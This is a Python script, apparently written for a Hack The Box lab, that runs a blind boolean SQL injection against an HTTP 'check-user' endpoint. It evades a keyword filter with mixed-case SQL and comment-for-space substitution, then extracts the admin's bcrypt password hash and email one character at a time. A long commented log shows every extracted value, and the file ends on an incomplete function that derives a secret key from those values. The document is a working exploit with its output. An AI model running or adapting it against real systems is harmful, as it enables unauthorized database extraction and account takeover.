import asyncio
import aiohttp
import urllib.parse
import hashlib
import base64
from aiohttp import ClientSession
from typing import Optional


# Target URL and headers (simulating a browser)
url = "http://10.129.204.251:8080/api/v1/check-user"
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive"
}

# Character set to brute-force
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"

async def bypass(payload: str) -> str:
    """
    Bypasses filter by replacing keywords with mixed-case versions
    and replacing spaces with '/****/' to evade space or '/**/' filtering.
    Also handles filtered substrings like 'or' in 'password'.
    """
    repl = {
        "select": "sElEcT",
        "SELECT": "sElEcT",
        "substring": "sUbStRiNg",
        "SUBSTRING": "sUbStRiNg",
        "ascii": "aScIi",
        "ASCII": "aScIi",
        "and": "aNd",
        "AND": "aNd",
        "from": "fRoM",
        "FROM": "FrOm",
        "where": "wHeRe",
        "WHERE": "WhErE",
        " ": "/****/",                  
        "password": "pAssWoRd",         
        "PASSWORD": "pAssWoRd",
        "length": "lEnGtH",
        "LENGTH": "lEnGtH",
        "chr": "cHr",
        "CHR": "cHr",
        "cast": "cAsT",
        "CAST": "cAsT",
        "text": "tExT",
        "TEXT": "tExT",
        "as": "aS",
        "AS": "aS",
    }
    for k, v in repl.items():
        payload = payload.replace(k, v)
    return payload

async def check_payload(session: ClientSession, payload: str) -> bool:
    """
    Sends a single GET request with the given payload and checks if user exists.
    Returns True if response is '{"exists":true}', False otherwise.
    """
    try:
        async with session.get(url, params={"u": payload}, timeout=10) as response:
            text = await response.text()
            return text.strip() == '{"exists":true}'
    except asyncio.TimeoutError:
        print(f"[!] Timeout for payload: {payload[:60]}...")
        return False
    except Exception as e:
        print(f"[!] Request error: {e}")
        return False

async def find_data_length(session: ClientSession, max_len: int, data_name: str) -> Optional[int]:
    """
    Asynchronously determines the length of the admin data_name by testing lengths from 1 to max_len.
    Sequential testing is used here because only one length can be correct.
    """
    print(f"\n[*] Starting brute-force for admin {data_name} length...")
    for length in range(1, max_len + 1):
        payload = f"admin' and (select cast((select length({data_name}) from users where username='admin') as text))='{length}"
        final_payload = await bypass(payload)
        print(f"[DEBUG] Testing length {length}: {final_payload}")

        if await check_payload(session, final_payload):
            print(f"\n[+] {data_name} length found: {length}")
            return length

    print(f"[!] {data_name} length not found within limit.")
    return None

async def brute_force_position(session: ClientSession, position: int, data_name: str) -> Optional[str]:
    """
    Brute-forces a single character at the given position concurrently.
    Tests all characters in CHARS in parallel using asyncio.gather.
    Returns the found character or None if not found.
    """
    print(f"\n[+] Brute-forcing position {position}...", end="")

    async def test_char(char: str) -> tuple[bool, str]:
        payload = f"admin' and (select chr((select ascii(substring({data_name},{position},1)) from users where username='admin')))='{char}"
        final_payload = await bypass(payload)
        is_match = await check_payload(session, final_payload)
        return is_match, char

    # Create tasks for all characters
    tasks = [test_char(char) for char in CHARS]
    results = await asyncio.gather(*tasks)

    # Look for the first match
    for is_match, char in results:
        if is_match:
            print(f" Found char: '{char}'")
            return char

    print(" No character found at this position.")
    return None

async def main():
    """
    Main asynchronous function that coordinates the entire brute-force process.
    """
    async with aiohttp.ClientSession(headers=headers) as session:
        # Step 1: Find password length
        password_length = await find_data_length(session, max_len=100, data_name="password")
        if not password_length:
            print("[!] Failed to determine password length. Exiting.")
            return

        # Step 2: Brute-force each character position of the password
        password = ""
        print("[*] Starting password brute-force...")
        for pos in range(1, password_length + 1):
            char = await brute_force_position(session, position=pos, data_name="password")
            if char is None:
                print(f"[!] Could not find character at position {pos}. Stopping.")
                break
            password += char
            print(f"Current password: '{password}'")

        # Step 3: Find email length
        email_length = await find_data_length(session, max_len=100, data_name="email")
        if not email_length:
            print("[!] Failed to determine email length. Exiting.")
            return
        
        # Step 4: Brute-force each character position of the email
        email = ""
        print("[*] Starting email brute-force...")
        for pos in range(1, email_length + 1):
            char = await brute_force_position(session, position=pos, data_name="email")
            if char is None:
                print(f"[!] Could not find character at position {pos}. Stopping.")
                break
            email += char
            print(f"Current email: '{email}'")

        # Final result
        print("\n\n[+] Brute-force completed!")
        print(f"[+] Admin password: {password}")
        print(f"[+] Admin email: {email}")

# Run the async program
if __name__ == "__main__":
    asyncio.run(main())
    # pass


# [*] Starting brute-force for admin password length...
# [DEBUG] Testing length 1: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='1
# [DEBUG] Testing length 2: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='2
# [DEBUG] Testing length 3: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='3
# [DEBUG] Testing length 4: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='4
# [DEBUG] Testing length 5: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='5
# [DEBUG] Testing length 6: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='6
# [DEBUG] Testing length 7: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='7
# [DEBUG] Testing length 8: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='8
# [DEBUG] Testing length 9: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='9
# [DEBUG] Testing length 10: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='10
# [DEBUG] Testing length 11: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='11
# [DEBUG] Testing length 12: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='12
# [DEBUG] Testing length 13: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='13
# [DEBUG] Testing length 14: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='14
# [DEBUG] Testing length 15: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='15
# [DEBUG] Testing length 16: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='16
# [DEBUG] Testing length 17: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='17
# [DEBUG] Testing length 18: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='18
# [DEBUG] Testing length 19: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='19
# [DEBUG] Testing length 20: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='20
# [DEBUG] Testing length 21: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='21
# [DEBUG] Testing length 22: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='22
# [DEBUG] Testing length 23: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='23
# [DEBUG] Testing length 24: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='24
# [DEBUG] Testing length 25: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='25
# [DEBUG] Testing length 26: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='26
# [DEBUG] Testing length 27: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='27
# [DEBUG] Testing length 28: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='28
# [DEBUG] Testing length 29: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='29
# [DEBUG] Testing length 30: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='30
# [DEBUG] Testing length 31: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='31
# [DEBUG] Testing length 32: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='32
# [DEBUG] Testing length 33: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='33
# [DEBUG] Testing length 34: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='34
# [DEBUG] Testing length 35: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='35
# [DEBUG] Testing length 36: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='36
# [DEBUG] Testing length 37: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='37
# [DEBUG] Testing length 38: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='38
# [DEBUG] Testing length 39: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='39
# [DEBUG] Testing length 40: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='40
# [DEBUG] Testing length 41: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='41
# [DEBUG] Testing length 42: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='42
# [DEBUG] Testing length 43: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='43
# [DEBUG] Testing length 44: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='44
# [DEBUG] Testing length 45: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='45
# [DEBUG] Testing length 46: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='46
# [DEBUG] Testing length 47: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='47
# [DEBUG] Testing length 48: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='48
# [DEBUG] Testing length 49: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='49
# [DEBUG] Testing length 50: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='50
# [DEBUG] Testing length 51: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='51
# [DEBUG] Testing length 52: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='52
# [DEBUG] Testing length 53: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='53
# [DEBUG] Testing length 54: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='54
# [DEBUG] Testing length 55: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='55
# [DEBUG] Testing length 56: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='56
# [DEBUG] Testing length 57: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='57
# [DEBUG] Testing length 58: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='58
# [DEBUG] Testing length 59: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='59
# [DEBUG] Testing length 60: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(pAssWoRd)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='60

# [+] password length found: 60
# [*] Starting password brute-force...

# [+] Brute-forcing position 1... Found char: '$'
# Current password: '$'

# [+] Brute-forcing position 2... Found char: '2'
# Current password: '$2'

# [+] Brute-forcing position 3... Found char: 'a'
# Current password: '$2a'

# [+] Brute-forcing position 4... Found char: '$'
# Current password: '$2a$'

# [+] Brute-forcing position 5... Found char: '1'
# Current password: '$2a$1'

# [+] Brute-forcing position 6... Found char: '2'
# Current password: '$2a$12'

# [+] Brute-forcing position 7... Found char: '$'
# Current password: '$2a$12$'

# [+] Brute-forcing position 8... Found char: 'Q'
# Current password: '$2a$12$Q'

# [+] Brute-forcing position 9... Found char: 'Z'
# Current password: '$2a$12$QZ'

# [+] Brute-forcing position 10... Found char: 'z'
# Current password: '$2a$12$QZz'

# [+] Brute-forcing position 11... Found char: 'W'
# Current password: '$2a$12$QZzW'

# [+] Brute-forcing position 12... Found char: 'J'
# Current password: '$2a$12$QZzWJ'

# [+] Brute-forcing position 13... Found char: 'u'
# Current password: '$2a$12$QZzWJu'

# [+] Brute-forcing position 14... Found char: 'm'
# Current password: '$2a$12$QZzWJum'

# [+] Brute-forcing position 15... Found char: '2'
# Current password: '$2a$12$QZzWJum2'

# [+] Brute-forcing position 16... Found char: 'X'
# Current password: '$2a$12$QZzWJum2X'

# [+] Brute-forcing position 17... Found char: 'k'
# Current password: '$2a$12$QZzWJum2Xk'

# [+] Brute-forcing position 18... Found char: 'u'
# Current password: '$2a$12$QZzWJum2Xku'

# [+] Brute-forcing position 19... Found char: 'l'
# Current password: '$2a$12$QZzWJum2Xkul'

# [+] Brute-forcing position 20... Found char: 'S'
# Current password: '$2a$12$QZzWJum2XkulS'

# [+] Brute-forcing position 21... Found char: 'c'
# Current password: '$2a$12$QZzWJum2XkulSc'

# [+] Brute-forcing position 22... Found char: 'J'
# Current password: '$2a$12$QZzWJum2XkulScJ'

# [+] Brute-forcing position 23... Found char: 't'
# Current password: '$2a$12$QZzWJum2XkulScJt'

# [+] Brute-forcing position 24... Found char: 'J'
# Current password: '$2a$12$QZzWJum2XkulScJtJ'

# [+] Brute-forcing position 25... Found char: 'D'
# Current password: '$2a$12$QZzWJum2XkulScJtJD'

# [+] Brute-forcing position 26... Found char: 'r'
# Current password: '$2a$12$QZzWJum2XkulScJtJDr'

# [+] Brute-forcing position 27... Found char: 'Z'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZ'

# [+] Brute-forcing position 28... Found char: 'z'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz'

# [+] Brute-forcing position 29... Found char: '.'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.'

# [+] Brute-forcing position 30... Found char: 'G'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.G'

# [+] Brute-forcing position 31... Found char: 'F'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GF'

# [+] Brute-forcing position 32... Found char: 'p'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFp'

# [+] Brute-forcing position 33... Found char: 'V'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpV'

# [+] Brute-forcing position 34... Found char: 'R'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVR'

# [+] Brute-forcing position 35... Found char: 'j'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRj'

# [+] Brute-forcing position 36... Found char: 'K'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjK'

# [+] Brute-forcing position 37... Found char: 'g'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKg'

# [+] Brute-forcing position 38... Found char: 'U'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU'

# [+] Brute-forcing position 39... Found char: '.'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.'

# [+] Brute-forcing position 40... Found char: 'S'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.S'

# [+] Brute-forcing position 41... Found char: 'q'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq'

# [+] Brute-forcing position 42... Found char: '7'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7'

# [+] Brute-forcing position 43... Found char: 'O'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7O'

# [+] Brute-forcing position 44... Found char: 'v'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov'

# [+] Brute-forcing position 45... Found char: '1'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1'

# [+] Brute-forcing position 46... Found char: '.'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.'

# [+] Brute-forcing position 47... Found char: 'm'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.m'

# [+] Brute-forcing position 48... Found char: 'W'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mW'

# [+] Brute-forcing position 49... Found char: 'Y'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWY'

# [+] Brute-forcing position 50... Found char: 'y'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYy'

# [+] Brute-forcing position 51... Found char: 'n'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn'

# [+] Brute-forcing position 52... Found char: '0'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0'

# [+] Brute-forcing position 53... Found char: 'W'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W'

# [+] Brute-forcing position 54... Found char: '8'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8'

# [+] Brute-forcing position 55... Found char: 'Y'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8Y'

# [+] Brute-forcing position 56... Found char: 'h'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8Yh'

# [+] Brute-forcing position 57... Found char: 'I'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhI'

# [+] Brute-forcing position 58... Found char: 'Q'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQ'

# [+] Brute-forcing position 59... Found char: 'g'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQg'

# [+] Brute-forcing position 60... Found char: 'G'
# Current password: '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG'

# [*] Starting brute-force for admin email length...
# [DEBUG] Testing length 1: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='1
# [DEBUG] Testing length 2: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='2
# [DEBUG] Testing length 3: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='3
# [DEBUG] Testing length 4: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='4
# [DEBUG] Testing length 5: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='5
# [DEBUG] Testing length 6: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='6
# [DEBUG] Testing length 7: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='7
# [DEBUG] Testing length 8: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='8
# [DEBUG] Testing length 9: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='9
# [DEBUG] Testing length 10: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='10
# [DEBUG] Testing length 11: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='11
# [DEBUG] Testing length 12: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='12
# [DEBUG] Testing length 13: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='13
# [DEBUG] Testing length 14: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='14
# [DEBUG] Testing length 15: admin'/****/aNd/****/(sElEcT/****/cAsT((sElEcT/****/lEnGtH(email)/****/fRoM/****/users/****/wHeRe/****/username='admin')/****/aS/****/tExT))='15

# [+] email length found: 15
# [*] Starting email brute-force...

# [+] Brute-forcing position 1... Found char: 'a'
# Current email: 'a'

# [+] Brute-forcing position 2... Found char: 'd'
# Current email: 'ad'

# [+] Brute-forcing position 3... Found char: 'm'
# Current email: 'adm'

# [+] Brute-forcing position 4... Found char: 'i'
# Current email: 'admi'

# [+] Brute-forcing position 5... Found char: 'n'
# Current email: 'admin'

# [+] Brute-forcing position 6... Found char: '@'
# Current email: 'admin@'

# [+] Brute-forcing position 7... Found char: 'p'
# Current email: 'admin@p'

# [+] Brute-forcing position 8... Found char: 'a'
# Current email: 'admin@pa'

# [+] Brute-forcing position 9... Found char: 's'
# Current email: 'admin@pas'

# [+] Brute-forcing position 10... Found char: 's'
# Current email: 'admin@pass'

# [+] Brute-forcing position 11... Found char: '2'
# Current email: 'admin@pass2'

# [+] Brute-forcing position 12... Found char: '.'
# Current email: 'admin@pass2.'

# [+] Brute-forcing position 13... Found char: 'h'
# Current email: 'admin@pass2.h'

# [+] Brute-forcing position 14... Found char: 't'
# Current email: 'admin@pass2.ht'

# [+] Brute-forcing position 15... Found char: 'b'
# Current email: 'admin@pass2.htb'


# [+] Brute-force completed!
# [+] Admin password: $2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG 🎉
# [+] Admin email: admin@pass2.htb 🎉


# Step 5: Calculate the secret key
def calculate_secret_key(password: str, email: str) -> Optional[str]:
    """
    This function queries the database for a user by username,
    computes a secret key based on email + "$4lty" + password,
    using SHA-256 and a modified URL-safe Base64 encoding,
    and formats it as four groups of 4 characters separated by hyphens.
    """
    # Build the temporary string: email + "$4lty" + password
    tmp = email + "$4lty" + password
    
    # Compute SHA-256 hash of the UTF-8 bytes
    digest = hashlib.sha256()
    digest.update(tmp.encode("utf-8"))
    encoded_hash = digest.digest()  # byte array (32 bytes)
    
    # URL-safe Base64 encode (uses - and _ instead of + and /)
    # Java's getUrlEncoder() adds padding (=) if needed.
    b64 = base64.urlsafe_b64encode(encoded_hash).decode("utf-8")
    
    # Replace URL-safe chars - and _ with 'X' (as in Java .replaceAll("-|_", "X"))
    b64 = b64.replace("-", "X").replace("_", "X")
    
    # Note: Padding '=' remains if present (Java does not remove it here)
    # But we only use the first 16 characters anyway, which never include padding
    # because SHA-256 (32 bytes) encodes to exactly 44 chars (including possible ==)
    
    # Extract first 16 characters and format as xxxx-xxxx-xxxx-xxxx
